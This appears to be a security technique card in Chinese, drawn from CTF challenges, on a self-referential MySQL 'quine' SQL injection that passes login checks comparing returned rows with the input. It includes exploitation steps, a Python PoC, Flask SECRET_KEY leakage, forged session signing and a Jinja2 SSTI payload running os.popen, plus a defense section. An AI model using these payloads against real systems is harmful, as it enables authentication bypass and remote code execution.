---
id: web-generic-sqli-replace-hex-self-referential-quine
title: SQL Quine 绕过 UNION 结果自校验：REPLACE(@a:=模板, 占位符, HEX(@a)) 让返回行等于注入 payload 自身（含 SHA2 变体）
type: scenario
domain: web
path: web/generic/sqli
technique: mysql-replace-hex-self-referential-quine
aliases:
- SQL Quine
- 奎因注入
- REPLACE HEX 自引用
- username password 回显校验绕过
- No Quotes 2
- No Quotes 3
tags:
- web
- sqli
- mysql
- quine
- self-reference
- replace
- hex
- union
- sha2
- waf-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V166
  verified_at: '2026-11-06T13:58:43+08:00'
  notes: 已对照原文与 No Quotes 2/3 代码核对：quine 表达式 REPLACE(@a:=_utf8 0x.,0x2E,HEX(@a)) 的自引用构造、username 用 _utf8 0x<hex> 精确匹配、SHA256 变体 LOWER(SHA2(REPLACE(@a:=0x$,0x24,HEX(@a)),256))、{{config}}\ 泄 SECRET_KEY、复用服务端 cookie timestamp 与 HMAC-SHA1(secret, b'cookie-session') 手签 session、最后 /home 触发 RCE 均与原文一致。无 sources/source_url；技术卡无产品版本。未在本机复跑。
---

## 一句话结论

当登录逻辑要求 UNION 返回的 `username`、`password` 必须与提交值逐字相等时，可用 MySQL 自引用表达式构造“输出等于自身源码”的 payload：`REPLACE(@a:=_utf8 0x<模板hex>, 占位符, HEX(@a))` 会把自己替换成完整的最终字符串，从而让 `row[1] == password`；再让 `row[0]` 等于提交的用户名（十六进制字面量），即可通过校验并获得可控 session 值，后续触发 SSTI/会话伪造。

## 原理

- 目标校验（示例）：
  ```python
  if not username == row[0] or not password == row[1]:
      return "Invalid credentials."
  ```
  `row` 来自 `UNION`，攻击者要让它“看起来等于”自己提交的两个字符串。
- **Quine 构造**：假设最终要发送的 password 是 `P`，其中包含占位符 `.`（或 `$`）。SQL 中写：
  ```sql
  )UNION SELECT _utf8 0x<username_hex>,
  REPLACE(@a:=_utf8 0x<hex(P_with_placeholder)>, 0x2E, HEX(@a))#
  ```
  - `@a := _utf8 0x<hex(P_with_placeholder)>` 把“带占位符的完整模板”存进用户变量；
  - `HEX(@a)` 得到该模板的十六进制文本；
  - `REPLACE(模板, 0x2E, HEX(@a))` 把模板里的 `.` 替换成模板自身的 hex，得到的结果 **恰好等于** 发送的 password（因为发送的 password 就是 `P_with_placeholder` 中的 `.` 被模板 hex 替换后的字符串）。
  - 这就是 SQL 层面的 quine：表达式求值结果等于表达式在 payload 中的最终文本。
- **username 侧**：`UNION SELECT` 第一列用 `_utf8 0x<username_hex>` 精确等于提交的 username（可含 `{{config}}` 等 SSTI 载荷与绕过反斜杠）。
- **为什么用十六进制**：WAF 拦截 `'`/`"`（以及第三关的 `.`），`0x...` 字面量可在不出现引号的情况下表示任意字符串；当 `.` 被禁时改用 `$` 作占位符、`0x24` 作为 REPLACE 的查找字节。
- **SHA2 变体**：若校验改为 `sha256(password) == row[1]`，把整个 quine 表达式包一层 `LOWER(SHA2(REPLACE(...), 256))`，返回值即为提交 password 的 SHA-256，仍然通过。
- **后续利用**：登录成功后 session 的 `user` 来自 `row[0]`，可放入 `{{config}}` 泄漏 Flask `SECRET_KEY`；再用已知 SECRET_KEY 手动签名含 RCE 模板的 session cookie（Flask 的 `cookie-session` 派生 key = HMAC-SHA1(secret, b"cookie-session")），并复用服务器下发 cookie 的 timestamp 规避时钟偏差，访问 `/home` 触发 SSTI。

## 触发条件

- MySQL/MariaDB，支持用户变量 `@a:=`、`REPLACE`、`HEX`、`SHA2`，且注入点可 UNION。
- 应用把 SQL 返回行与提交参数做相等比较（登录/注册/二次校验），否则不需要 quine。
- WAF 只拦引号/点号等字符，未拦 `@`、`REPLACE`、`HEX`、`0x`。
- 登录后的 session 值会在模板中被二次渲染。

## 利用步骤

1. 确认查询列数、回显列，以及服务端是否比较 `username == row[0]` / `password == row[1]`。
2. 选择占位符：`.` 可用时用 `0x2E`；`.` 被 ban 时用 `$` + `0x24`。
3. 构造模板 `T = ")UNION SELECT _utf8 0x<u_hex>,REPLACE(@a:=_utf8 0x<占位符>, <占位符hex>, HEX(@a))#"`；计算 `T_hex = hex(T)`；发送 password = `T` 中占位符替换为 `T_hex` 的字符串。
4. 若校验是 SHA-256：把 `REPLACE(...)` 改为 `LOWER(SHA2(REPLACE(...),256))`，password 发送原始 quine 结果（不发送 hash），因为服务端自己会算 SHA-256。
5. 登录成功；令 username 含 `{{config}}\`（反斜杠用于闭合引号），访问 `/home` 读取 `SECRET_KEY`。
6. 用泄露的 secret 手动签 session（复用服务器 cookie 的 timestamp），把 `user` 设为 `{{ config.__class__.__init__.__globals__['os'].popen('/readflag').read() }}`，访问 `/home` 执行命令。

## PoC

```python
import binascii, json, hmac, hashlib, base64, requests

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=")
def sign(secret, payload, ts_b64):
    data = b64u(json.dumps(payload, separators=(",", ":")).encode())
    key = hmac.new(secret, b"cookie-session", hashlib.sha1).digest()
    sig = b64u(hmac.new(key, data + b"." + ts_b64.encode(), hashlib.sha1).digest())
    return (data + b"." + ts_b64.encode() + b"." + sig).decode()

s = requests.Session()
username = "{{config}}\\"
u_hex = binascii.hexlify(username.encode()).decode().upper()

# 普通 quine（password == row[1]）
tpl = f")UNION SELECT _utf8 0x{u_hex},REPLACE(@a:=_utf8 0x.,0x2E,HEX(@a))#"
tpl_hex = binascii.hexlify(tpl.encode()).decode().upper()
password = tpl.replace(".", tpl_hex)

# SHA-256 变体（row[1] == sha256(password)）：
# tpl = f")UNION SELECT 0x{u_hex},LOWER(SHA2(REPLACE(@a:=0x$,0x24,HEX(@a)),256))#"
# password = tpl.replace("$", binascii.hexlify(tpl.encode()).decode().upper())

r = s.post(URL + "/login", data={"username": username, "password": password})
ts = s.cookies.get("session").split(".")[1]
# ... 从 /home 提取 SECRET_KEY，再 sign() 伪造会话
```

## 变体与关联

- **占位符选择**：`.`→`0x2E`、`$`→`0x24`，也可用其他不在 payload 中的字节。
- **哈希校验**：`SHA2(...,256)`、`MD5`、`SHA1` 同理，只要把 quine 结果包进对应哈希函数。
- **第二列类型**：若列是数字/日期，可换 `CAST`/`CONVERT` 或调整 UNION 列类型。
- **关联**：`web-generic-sqli-backslash-quote-blacklist-hex-union-session-ssti`（前置的引号黑名单与反斜杠注入）；`web-python-ssti-jinja2-flask-globals-rce`（得到 session 后的模板 RCE）。
- **边界**：禁用用户变量、过滤 `REPLACE`/`HEX`/`@`，或使用预编译查询时失效；`NO_BACKSLASH_ESCAPES` 会影响前置注入。

## 检测与防御

- **SQL 侧**：预编译/参数化，禁止拼接；WAF 覆盖 `@a:=`、`REPLACE(...,HEX(`、`SHA2(`、`0x` 长十六进制串、`#` 注释。
- **逻辑侧**：不要用“数据库返回值 == 用户输入”做安全校验；应基于数据库中的用户 ID/密码哈希校验，且哈希比较用恒定时间函数。
- **会话侧**：`SECRET_KEY` 泄露后必须轮换；session cookie 使用 HttpOnly/Secure/SameSite；不要复用旧 timestamp；模板不要用 `render_template_string` 渲染用户值。
- **检测**：登录请求中出现自引用 hex 结构、同一账号短时间内登录后访问 `/home` 并出现命令输出；AUDIT 日志记录完整 SQL（脱敏）便于发现 quine 模式。
